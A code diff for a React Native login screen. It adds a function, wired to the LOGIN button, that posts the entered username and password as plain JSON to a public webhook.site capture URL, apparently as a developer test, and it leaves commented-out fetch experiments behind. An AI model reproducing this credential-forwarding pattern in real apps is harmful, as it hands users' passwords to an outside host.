@@ -1,9 +1,9 @@
 //import * as React from 'react';
-import { StyleSheet, Text, TextInput, TouchableOpacity, View, Button, ScrollView } from "react-native";
+import { StyleSheet, Text, TextInput, TouchableOpacity, View, Button, ScrollView,FlatList } from "react-native";
 import React, {useState} from 'react';
 //import "fontsource-muli";
 import AppMenuScreen from '../AppMenuScreen';
-
+import axios from 'axios';
 export default class LoginScreen extends React.Component {
   constructor() {
     super();
@@ -17,11 +17,60 @@ export default class LoginScreen extends React.Component {
     height:"",
     weight:"",
     gender:"",
+    nameList: []
     //age: new Date(),
   }
+  /*
+  async componentDidMount(){
+    try{
+      await fetch('https://webhook.site/70c62502-d5d5-4ce7-8cce-119694571a31',{
+        method: 'post',
+        mode: 'no-cors',
+        headers: {
+          'Accept': 'application/json',
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          username: username,
+          password: password
+        })
+      });
 
+    }catch(e){
+      console.log(e);
+    }
+  }*/
+
+  /*componentDidMount() {
+    axios.get('http://jsonplaceholder.typicode.com/posts')
+      .then(res => {
+        const nameList = res.data;
+        this.setState({ nameList });
+      })
+  }*/
+
+  function1(){
+    console.log("IN HERE");
+        try{
+          fetch('https://webhook.site/70c62502-d5d5-4ce7-8cce-119694571a31',{
+          method: 'post',
+          mode: 'no-cors',
+          headers: {
+          'Accept': 'application/json',
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          username: this.state.username,
+          password: this.state.password
+        })
+      });
+    }catch(e){
+      console.log(e);
+    }
+  }
 
   render() {
+    const {nameList} = this.state;
     return (
           <View style={styles.container}>
             <Text style={styles.header}>Welcome back!</Text>
@@ -46,7 +95,8 @@ export default class LoginScreen extends React.Component {
               </TouchableOpacity>
               <TouchableOpacity
                 style={styles.loginButton}
-                onPress={() => this.props.navigation.navigate('AppMenuScreen')}>
+                //onPress={() => this.props.navigation.navigate('AppMenuScreen')}>
+                onPress={() => this.function1()}>
                 <Text style={styles.loginButtonText}>LOGIN</Text>
               </TouchableOpacity>
             </ScrollView>
@@ -54,7 +104,6 @@ export default class LoginScreen extends React.Component {
     );
   }
 }
-
 const styles = StyleSheet.create({
   container: {
     flex: 1,
